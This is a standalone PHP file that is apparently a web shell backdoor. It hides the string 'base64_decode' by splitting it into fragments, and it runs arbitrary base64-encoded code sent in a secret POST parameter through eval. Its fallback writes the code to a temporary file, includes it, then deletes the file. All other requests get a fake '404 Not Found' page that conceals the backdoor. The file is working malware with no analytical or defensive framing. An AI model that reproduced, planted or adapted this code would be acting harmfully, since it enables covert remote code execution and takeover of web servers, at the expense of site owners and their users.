<?php
$version = "1.6";
$fuHFSF77HSH = "FFSW3525KKSfj";
$iJSFD78SHDJHu_sdh = false;
$KJfhj87DF_DFfjmm = "";
$YUGHSy_qwe3456_nnn = "b".""."".""."as".""."".""."e"."".""."6"."".""."4"."_".""."".""."de".""."c"."o".""."".""."".""."d".""."".""."e";
$YYSUurjj7347SJJ = "";
$uJDNhr_34fdhWhhh =  realpath("")."/";
$KLOIf_asd3455 = "FFhwu22313_fff555ffsd.php";

if(!empty($_POST[$fuHFSF77HSH]) and strlen($_POST[$fuHFSF77HSH]) > 0 and isset($_POST[$fuHFSF77HSH])){
 $KJfhj87DF_DFfjmm = "\$iJSFD78SHDJHu_sdh = true;";
 @eval($KJfhj87DF_DFfjmm);
 if ($iJSFD78SHDJHu_sdh === true) {
    $YYSUurjj7347SJJ = $YUGHSy_qwe3456_nnn($_POST[$fuHFSF77HSH]);
    @eval($YYSUurjj7347SJJ);
 }else{
    if(@file_put_contents($uJDNhr_34fdhWhhh.$KLOIf_asd3455,"<?php\n".$YUGHSy_qwe3456_nnn($_POST[$fuHFSF77HSH])."\n?>")){
        @include_once($uJDNhr_34fdhWhhh.$KLOIf_asd3455);
        @unlink($uJDNhr_34fdhWhhh.$KLOIf_asd3455);
    }else{
        echo "ERROR! CANT DO NOTHING!";
    }
 }
}else{
        echo "<html><head>
                <title>404 Not Found</title>
                </head><body>
                <h1>Not Found</h1>
                <p>The requested URL was not found on this server.</p>
                </body></html>";
}
?>
